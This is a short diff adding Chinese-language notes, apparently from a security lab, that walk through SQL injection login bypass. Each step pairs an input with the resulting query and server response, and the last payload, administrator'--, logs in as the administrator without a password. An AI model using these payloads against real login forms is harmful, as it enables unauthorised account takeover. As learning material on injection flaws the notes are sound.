@@ -1,0 +1,19 @@
+SQL注入漏洞允许绕过登录:
+
+SELECT * FROM users WHERE username = 'Rinton' AND password = '123'
+
+'
+SELECT * FROM users WHERE username = ''Rinton' AND password = '123'
+>>Inter server error
+
+'--
+SELECT * FROM users WHERE username = ''--Rinton' AND password = '123'
+>>Invalid username and password
+
+' or 1=1--
+SELECT * FROM users WHERE username = '' or 1=1--Rinton' AND password = '123'
+>>/my-account?id=administrator 302 重定向
+
+将username设为administrator'--，注释密码绕过检查
+SELECT * FROM users WHERE username = 'administrator'--' AND password = '123'
+>> OK
